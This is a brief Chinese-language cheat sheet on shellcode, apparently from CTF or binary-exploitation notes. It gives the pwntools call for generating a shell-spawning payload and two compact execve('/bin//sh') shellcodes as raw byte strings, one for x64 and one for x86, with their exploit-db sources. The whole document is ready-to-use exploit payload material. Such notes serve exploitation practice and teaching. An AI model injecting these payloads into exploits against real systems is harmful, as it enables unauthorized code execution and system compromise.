## shellcode
pwntool生成shellcode，不過有44個字節比較大：
```
asm(shellcraft.sh())
```
x64上只有23個字節的shellcode
```
https://www.exploit-db.com/exploits/36858/
shellcode_x64 = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
```
x86上的19個字節的shellcode，但是在這裏好像只能用上面這個
```
https://www.exploit-db.com/exploits/40131
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"
```